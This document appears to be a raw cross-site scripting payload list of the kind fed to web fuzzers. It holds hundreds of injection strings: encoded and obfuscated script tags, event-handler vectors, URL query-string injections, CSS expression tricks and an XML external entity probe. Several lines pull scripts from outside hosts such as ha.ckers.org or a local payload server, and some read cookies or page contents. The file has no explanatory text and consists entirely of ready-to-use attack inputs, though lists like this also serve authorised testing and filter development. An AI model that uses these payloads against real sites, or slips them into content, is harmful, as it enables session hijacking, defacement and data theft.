&#60;IFRAME SRC&#61;http&#58;&#47;&#47;testsite.com&#47;scriptlet.html &#60;
"<form><iframe &#09;&#10;&#11; src=""javascript&#58;confirm(1)""&#11;&#10;&#09;;>"
</br style=a:expression(alert(1))>
"<svg xmlns=""http://www.w3.org/2000/svg"">LOL<script>alert(123)</script></svg>"
<x onmousedown=alert(1)>click this!
"&lt;SCRIPT/SRC=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;js\""&gt;&lt;/SCRIPT&gt;"
"&email=[email]&id=""><script>alert('XSS')</script>"
'><body/onpageshow=alert(1)>
\”;alert(1)//
;})javascript:confirm(0);
&blogid=120
"&lt;IMG SRC=""javascript:alert(1)"""
<IMG%20SRC=JaVaScRiPt:alert('WXSS')>
><script>alert(123)</script>
<body language=vbs onload=alert-1 // IE-8
"<script>ReferenceError.prototype.__defineGetter__('name', function(){alert(123)}),x</script>"
"<BGSOUND SRC=""javascript:alert('XSS');"">"
"<input type=""text"" AUTOFOCUS onfocus=alert(1)>"
&&afp=%22%3E%3Cscript%3Ealert%28%27xssd%27%29;%3C/script%3E&afu=%22%3E%3Ctextarea%3E
&#60;LINK REL&#61;&#34;stylesheet&#34; HREF&#61;&#34;javascript&#58;alert&#40;&#39;XSS&#39;&#41;&#59;&#34;&#62;
"<iframe src=""view-source:http://www.example.org/"" frameborder=""0"" style=""width:400px;height:180px""></iframe><textarea type=""text"" cols=""50"" rows=""10""></textarea>"
"&lt;BR SIZE=\\""&{alert(\'XSS\')}\\""&gt;"
"<style></style\x3E<img src=""about:blank"" onerror=javascript:alert(1)//></style>"
"""><script/src=data:,alert(1)%26sol;%26sol;"
"{""source"":{},""__proto__"":{""source"":""$`onerror=prompt(1)>""}}"
"<script>var a = ""</script> <script> alert('XSS !'); </script> <script>"";</script>"
<script>class a{@alert get}</script>
"<iframe src=""data:data:javascript:,% 3 c script % 3 e confirm(1) % 3 c/script %3 e"">"
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
""");eval(name+"""
'><iframe<?php echo chr(12)?> onload=alert(1)></iframe>
"<img src=a onerror=eval(String.fromCharCode(97,108,101,114,116,40,39,67,104,101,97,116,115,111,110,39,41))>"
"<script>x="""">>prompt(9)>>"""";y=42;</script>"
<BODY ONLOAD=alert('XSS')>
"""`'><script>\xE2\x80\x81javascript:alert(1)</script>"
><script>'confirm(0)%3B<%2Fscript>
"</a onmousemove=""alert(1)"">"
"sstyle=foobar""tstyle=""foobar""ystyle=""foobar""lstyle=""foobar""estyle=""foobar""=-moz-binding:url(http://h4k.in/mozxss.xml#xss)>foobar</b>#xss)"" a="""
"<a href=""\x0Djavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>"
<script>1\u0069\u006E[];</script>
"&lt;IMG STYLE=\\""xss&#58;expr/*XSS*/ession(alert(\'XSS\'))\\""&gt;"
<script>//>%0Aalert(1);</script>
"﻿data:text/html;alert(1)/*,<svg%20onload=eval(unescape(location))><title>*/;alert(2);function%20text(){};function%20html(){}"
<body onscroll=javascript:alert(1)><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
"<script\x3Etype=""text/javascript"">javascript:alert(1);</script>"
"<iframe/src=""data:text/html,<svg%09%0A%0B%0C%0D%A0%00%20onload=confirm(1);>"">"
"<iframe src=""ms-appx-web://microsoft.windows.spartan/%2e%2e%2f%2e%2e%2fTemp/blah.txt"">"
&#x03e;
&#x00003c;
"<svg xmlns=""http://www.w3.org/2000/svg""><g onload=""javascript:alert(1)""></g></svg"
<BODY ONLOAD=alert('hellox worldss')>
<x onmouseover=alert(1)>hover this!
"<!DOCTYPE x[<!ENTITY x SYSTEM ""http://html5sec.org/test.xxe"">]><y>&x;</y>"
'><SCRIPT LANGUAGE=VBS>EXECSCRIPT(LCASE(“ALERT(1)”)) </SCRIPT>
"""`\'><script>\\x21javascript:alert(1)</script>"
a=1;a=eval;b=alert;a(b(11));//
"&clientAccnum=938022&clientSubacc=0000&formName=43cc&language=English'%20STYLE='display:block;position:absolute;top:0;left:0;width:999px;height:999px;'%20onmouseover='alert(/XSS/)&allowedTypes=0000023138:840,0000023139:840,0000000216:840&subscriptionTypeId=0000000216:840"
"<img\x10src=x onerror=""javascript:alert(1)"">"
%253Cscript%253Ealert(1)%253C/script%253E
""";phpinfo();"
&#X003e;
"<IMG SRC=""jav	ascript:alert('X');"">"
"&lt;DIV STYLE=\""width&#58; expression(alert('XSS'));\""&gt;"
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
"javascript://\'//"" --></textarea></style></script></title><b onclick= alert()//>*/alert()/*"
&#X03c;
"'><img src=""http://127.0.0.1:3555/xss_serve_payloads/gif.gif"" onerror=alert(1)>"
<frameset onload=popup=1;>
&Keywords=%22%22%3Cscript%3Ealert(%22xss%22)%3C/script%3E
javascript:prompt(1)
&#X000003c
"/</title/'/</style/</script/--><p"" onclick=alert()//>*/alert()/*"
"<META HTTP-EQUIV=""Set-Cookie"" Content=""USERID=<SCRIPT>document.cookie=true</SCRIPT>"">"
&Module=SMMComplain&SMMOp=View&enter=SAMECRAP&SMM_CMD=SendLetter&SMMComplain_View_URL=1%3Cimg+src=http://talks.php.net/presentations/slides/php-under-attack/xss.png+onload=alert%28unescape%28/xss/.source%29%29%3E&SMMComplain_View_Message=[email]
"""><x style=x:expression(alert(1))>"
&quot;onmouseover=&quot;alert(1)
<video/onprogress=alert(1)><source/src=x>
&#60;META HTTP-EQUIV&#61;&#34;Link&#34; Content&#61;&#34;&#60;http&#58;&#47;&#47;testsite.com&#47;xss.css&#62;&#59; REL&#61;stylesheet&#34;&#62;
"""><svg><style>&ltimg src=x onerror=alert(1)&gt</svg>"
"""><img src=""x:X"" onerror=""alert(1)"">"
‘; alert(1); var foo=’
"""><meta HTTP-EQUIV=""REFRESH"" content=""0; url=http://127.0.0.1:3555/xss_serve_payloads/X.html"">"
"""><b/onclick=""javascript:window.window.window['confirm'](1)"">bold"
<script crossorigin>alert(1);</script>
"&search=""><script>alert('XSS')</script>"
'>< %3C &lt &lt; &LT &LT; &#60 &#060 &#0060 &#00060 &#000060 &#0000060 &#60; &#060; &#0060; &#00060; &#000060; &#0000060; &#x3c &#x03c &#x003c &#x0003c &#x00003c &#x000003c &#x3c; &#x03c; &#x003c; &#x0003c; &#x00003c; &#x000003c; &#X3c &#X03c &#X003c &#X0003c &#X00003c &#X000003c &#X3c; &#X03c; &#X003c; &#X0003c; &#X00003c; &#X000003c; &#x3C &#x03C &#x003C &#x0003C &#x00003C &#x000003C &#x3C; &#x03C; &#x003C; &#x0003C; &#x00003C; &#x000003C; &#X3C &#X03C &#X003C &#X0003C &#X00003C &#X000003C &#X3C; &#X03C; &#X003C; &#X0003C; &#X00003C; &#X000003C; \x3c \x3C \u003c \u003C
<s%00c%00r%00%00ip%00t>confirm(0);</s%00c%00r%00%00ip%00t>
"""><script>alert(\'\\/\\1\\/\\\')</script>"
"""><BGSOUND SRC=""javascript:alert(1);"">"
"document.location=""http://127.0.0.1:3555/xss_serve_payloads/X.html"""
"<STYLE>@im\\port\'\\ja\\vasc\\ript:alert(""XSS"")\';</STYLE>"
"“><script>alert(String.fromCharCode(75,67,70))</script>"
"""><img src='http://127.0.0.1:3555/xss_serve_payloads/xxxgif.gif' onerror='document.scripts(0).src=""http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp""'>"
"<embed src=""data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="">"
&#000060
"&lt;A HREF=\\""http&#58;//66&#46;102&#46;7&#46;147/\\""&gt;XSS&lt;/A&gt;"
"'><SCRIPT a="">"" SRC=""http://127.0.0.1:3555/xss_serve_payloads/X.js""></SCRIPT>"
"<SCRIPT/XSS SRC=""http://ha.ckers.org/xss.js""></SCRIPT>"
"<object data=""data:text/html;base64,%(base64)s"">"
"""]<img src=1 onerror=alert(1)>"
http://www.<script>alert(1)</script .com
&#000060;
"&lt;A HREF=\\""http&#58;//0102&#46;0146&#46;0007&#46;00000223/\\""&gt;XSS&lt;/A&gt;"
"""`\'><script>\\xE3\\x80\\x80javascript:alert(1)</script>"
"""<div style=""""binding: url([link to code]);""""> [Mozilla]"""
"<div style=""binding: url(""http://127.0.0.1:3555/xss_serve_payloads/X.html""));"">"
<iMg srC=1 lAnGuAGE=VbS oNeRroR=mSgbOx(1)>
"<html onMouseOut html onMouseOut=""javascript:javascript:alert(1)""></html onMouseOut>"
"<comment><img src=""</comment><img src=x onerror=prompt(1)//"">"
"<! foo=""[[[Inception]]""><x foo=""]foo><script>alert(1)</script>"">"
"""<IMG%20SRC=""""jav"
&#000062;
"'><video><source onerror=""prompt(1)""></source></video>"
"'><x style=""background:url('x[a];color:red;/*')"">XXX</x>"
'><script>eval(‘a\u006cert(1)’);</script>
"<meta http-equiv=Set-Cookie content=""testefar=4704"">"
"""><video onprogress=alert(1)><source src=http://127.0.0.1:3555/xss_serve_payloads/X.ogg>"
"perl -e 'print \""&lt;IMG SRC=java\0script&#058;alert(\\""XSS\\"")&gt;\"";' &gt; out"
“/><marquee onfinish=confirm(1)>a</marquee>
'><img src=x onerror=document.body.innerHTML=location.hash>#<img src=x onerror=prompt(1)>
"""><script xmlns=""http://www.w3.org/1999/xhtml"">&#x61;l&#x65;rt&#40;1)</script>"
∀㸀㰀script㸀confirm(1)㰀/script㸀
"<IMG SRC=""jav&#x0D;ascript:confirm(<WBR>document.location);"">"
"<video><source onerror=""alert(1)"">"
"""><SCRIPT> alert(\""1\"")</SCRIPT>"
"<BGSOUND SRC=""javascript:alert('CrossSiteScripting');"">"
<img border=3 alt=jaVasCript:/*-/*`/*\`/*&#039;/*&quot;/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e>
"""><META HTTP-EQUIV=""refresh"" CONTENT=""0;url=data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg=="">"
"""==prompt(9)=="""
"<iframe%20onload=""new%20Promise($=>alert(location))"">"
"<img src=x onerror=\\x12""javascript:alert(1)"">"
"<IMG STYLE=""xss:expr/*XSS*/ession(confirm(document.location))"">"
"&sl='""--></style></script><script>alert(document.cookie)</script>"
<img src='1'onerror=alert(0)>
"<!--#echo var=""document_root"" -->"
<img language=vbs src=<b onerror=confirm#1/1#>
"<frameset><frame src=""xss""></frameset>"
"""><a href=""123"" id=x>test</a><script>x='javascript:alert(1)';</script>"
&lang=en&page=49&tbmonth=09&tblng=1&tbyear=2010'%22%3Cscript%3Ealert%28/XSS/.source%29%3C/script%3E&tbfrom=0&tbto=30
<a href=”javascript:”>Clickme</a>
&criteria=%3Cscript%3Ealert(%22XSS!%22);%3C/SCRIPT%3E
"""[\xC0][\xBC]script>document.write(""""XSS-XSS-XSS"""");[\xC0][\xBC]/script>"""
innerHTML=innerText
"<script onReadyStateChange script onReadyStateChange=""javascript:javascript:alert(1)""></script onReadyStateChange>"
"'><img src="""" onerror=alert(1);>"
<!--\x3E<img src=xxx:x onerror=javascript:alert(1)> -->
<input srcset=x href=x onclick=popup=1; >
<i onwheel=alert(1)> Scroll over me </i>
<a href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:javascript:alert(1)>XXX</a>
"""><script>function::[‘alert’](1)</script>"
"<form action='data:text&sol;html,&lt;script&gt;alert(1)&lt/script&gt'><button>CLICK"
"<img src=x\x09onerror=""javascript:alert(1)"">"
"""><XML ID=0><I><B>&lt;IMG SRC=""javas<!-- -->cript:alert(1)""&gt;</B></I></XML>"
"<SCRIPT a="">"" '' SRC=""http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp""></SCRIPT>"
"""><img onerror=a&#0108ert(1) src=a>"
"<""';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//\"";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>"
"<a href=""&#38&#35&#49&#48&#54&#38&#35&#57&#55&#38&#35&#49&#49&#56&#38&#35&#57&#55&#38&#35&#49&#49&#53&#38&#35&#57&#57&#38&#35&#49&#49&#52&#38&#35&#49&#48&#53&#38&#35&#49&#49&#50&#38&#35&#49&#49&#54&#38&#35&#53&#56&#38&#35&#57&#57&#38&#35&#49&#49&#49&#38&#35&#49&#49&#48&#38&#35&#49&#48&#50&#38&#35&#49&#48&#53&#38&#35&#49&#49&#52&#38&#35&#49&#48&#57&#38&#35&#52&#48&#38&#35&#52&#57&#38&#35&#52&#49"">Clickhere</a>"
&o=&q=%3Cscript+type%3D%22text%2Fjavascript%22%3Ealert%28%27lol+porn+xss%27%29%3B%3C%2Fscript%3E
<!--[if]><script>alert(1)</script --><!--[if<img src=x onerror=alert(2)//]> -->
"""><SCRIPT>+alert(""X"")</SCRIPT>"
"/</title/'/</style/</script/</textarea/--><p"" onclick=alert()//>*/alert()/*"
"""><img onerror=alert(1) src=a>"
&woord=%3Cbody%20onload=alert('XSS')%3E
&#60;IMG SRC&#61;&#34;javascript&#58;alert&#40;&#39;XSS&#39;&#41;&#59;&#34;&#62;
"<script src=""data:&comma;alert(1)//"
"""><img onerror=`alert(1)`src=a>"
&name111=%22\\%3E%3Cscript%3Ealert(0)%3C/script%3E
j&#x61;v&#x41;sc&#x52;ipt&#x3A;al&#x65;rt&lpar;1&rpar;
<x contenteditable onkeydown=alert(1)>press any key!
&text=%3Cscript%3Ealert('test')%3C/script%3E
"<event-source src=""%(event)s"" onload=""javascript:alert(1)"">"
"'><script src=""#"">{alert(1)}</script>;1"
"eval.call(this,unescape.call(this,location))"
"<script>document.cookie=""testvdxv=6923;""</script>"
"<BASE HREF=""javascript:alert('XSS');//"">"
"&lt;A HREF=\\""http&#58;//google&#46;com/\\""&gt;XSS&lt;/A&gt;"
&pageSection=free_home_game_search&pogoword=%27%29;alert%28/xss/.source%29;//
&#60
"<body onpagehide body onpagehide=""javascript:javascript:alert(1)""></body onpagehide>"
"<DIV STYLE=""background-image: url(http://ha.ckers.org/xss.js)"">Div Body</DIV>"
"""><isindex action=j&Tab;a&Tab;vas&Tab;c&Tab;r&Tab;ipt:alert(1) type=image>"
"<script>x=document.createElement(%22iframe%22);x.src=%22http://xssme.html5sec.org/404%22;x.onload=function(){window.frames[0].document.write(%22<script>Object.defineProperty(parent,'Safe',{value:{}});Object.defineProperty(parent.Safe,'get',{value:function(){return top.document.cookie}});confirm(parent.Safe.get())<\/script>%22)};document.body.appendChild(x);</script>"
"data:text/html,<script>confirm(0);confirm(1);location.reload();</script>"
XXX<style>*{color:gre/**/en !/**/important} /* IE 6-9 Standards mode */<!----><!--*{color:red}   /* all UA */*{background:url(xx:x //**/\red/*)} /* IE 6-7 Standards mode */</style>
"<script> var xdr = new ActiveXObject(%22Microsoft.XMLHTTP%22);  xdr.open(%22get%22, %22/xssme2%3Fa=1%22, true); xdr.onreadystatechange = function() { try{   var c;   if (c=xdr.responseText.match(/document.cookie = '(.*%3F)'/) )    alert(c[1]); }catch(e){} };  xdr.send(); </script>"
;alert(123);
"-1<TABLE BACKGROUND=""javascript:document.cookie=true;"">"
"""><meta http-equiv=""refresh"" content=""0;url=http://127.0.0.1:3555/xss_serve_payloads/X.html"">"
"<script>function makePopups(){	for (i=1;i<6;i++) {		window.open('popup.html','spam'+i,'width=50,height=50');	}}</script><body><a href=""#"" onclick=""makePopups()"">Spam</a>"
"&foo=<SCrIPT>alert(""I BEESEECH THEE, PHOTOETH MINE VISAGE"")</SCrIPT>"
"<IMG SRC=""jav	ascript:alert(1);"">"
"""><img src onerror /"" '""= alt=alert(1)//"">"
"<title onPropertyChange title onPropertyChange=""javascript:javascript:alert(1)""></title onPropertyChange>"
"""<XSS STYLE=""""xss:expression(alert('XSS'))"""">"""
"""><embed src=javascript:alert(1)>"
"<p class=""comment"" title=""*/prompt(1)'""></p>"
"'><a style=""-o-link:'javascript:alert(1)';-o-link-source:current"">X</a>"
"<a href=""javascript:history:alert(this.history.length)"">click</a>"
"<body style=""height:1000px"" onwheel=""[DATA]"">"
"</SCRIPT>”><SCRIPT>alert(String.fromCharCode(75,67,70))"
&#X003c
"""><form><button formaction=javascript&colon;alert(1)>CLICKME"
"<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=javascript:alert(\'XSS\');"">"
"&lt;DIV STYLE=\\""background-image&#58; url(javascript&#058;alert(\'XSS\'))\\""&gt;"
'><iframe  src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe> ​
<sc'+'ript>alert(1)</script>
onerror=eval;throw'alert\x281\x29';
&search=%22%2F%3E%3Cscript%3Ealert%28%27xss%27%29%3B%3C%2Fscript%3E
<body onhashchange=alert(1)><a href=#x>click this!#x
&q=%3Cscript%3Ealert(%22XSS%22)%3C/script%3E
<div contextmenu=x>right-click<menu id=x onshow=alert(1)>
"""><input onblur=write(1) autofocus><input autofocus>"
"""><iframe/onreadystatechange=confirm(1)"
"'><video src=1 href=1 onerror=""javascript:alert(1)""></video>"
"""><OBJECT CLASSID=""clsid:333C7BC4-460F-11D0-BC04-0080C7055A83""><PARAM NAME=""DataURL"" VALUE=""javascript:alert(1)""></OBJECT>"
&lt;IMG SRC=javascript&#058;alert(&quot;XSS&quot;)&gt;
"""><script src=data:&comma;alert(1)//"
"""><meta content=""&NewLine; 1 &NewLine;;JAVASCRIPT&colon; alert(1)"" http-equiv=""refresh""/>"
"""><SCRIPT a=`>` SRC=""http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp""></SCRIPT>"
&#X3C;
%uff1cscript%uff1ealert%uff08%uff07XSS%uff07%uff09%uff1b%uff1c%uff0fscript%uff1e
<script /***/>/***/confirm('\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF11\u1450')/***/</script /***/
<listing>&ltimg src=x onerror=alert(1)&gt</listing>
"\""></sCriPt><sCriPt >alert(0x000123)</sCriPt>"
"'';!--""<script>alert(0);</script>=&{(alert(1))}"
"'><img src='http://127.0.0.1:3555/xss_serve_payloads/xxxgif.gif' onerror='document.scripts(0).src=""http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp""'>"
"&lt;SCRIPT/XSS SRC=\\""http&#58;//ha&#46;ckers&#46;org/xss&#46;js\\""&gt;&lt;/SCRIPT&gt;"
<IMG+SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#39;&#41;>
"<iframe src=""data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==""></iframe"
"[4076*A]<img src=""x"" alt=""[0x8F]"" test="" onerror=confirm(1)//"">"
"<iframe src=%22404%22 onload=%22content.frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\\/script>%26quot;)%22></iframe>"
var a=0; ((a == 1) ? 2 : alert(1));//
"""<STYLE>@im\port'\ja\vasc\ript:alert(""""XSS"""")';</STYLE>"""
"';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//\"";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))<?/SCRIPT>&submit.x=27&submit.y=9&cmd=search"
"-1<BGSOUND SRC=""javascript:document.cookie=true;"">"
<style><!--</style><script>document.cookie=true;//--></script>
"data:text/html,<script>alert(document.domain)</script>"
"<iframe src=""http://target.com/something.jsp?inject=<script>eval(name)</script>"" name=""alert(1)""></iframe>"
&#60;IMG LOWSRC&#61;&#34;javascript&#58;alert&#40;&#39;XSS&#39;&#41;&#59;&#34;&#62;
"<img src=x onerror=""javascript:window.onerror=alert;throw 1"">"
"{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;'a'.constructor.prototype.charAt=''.valueOf;$eval('x=alert(1)//');}}"
top[/al/.source+/ert/.source](1)
"'><script src=""javascript:alert(1)"">"
"'><img src=""blah""onmouseover=""alert(1);"">"
"""><img src=x onerror=confirm(1); ..."
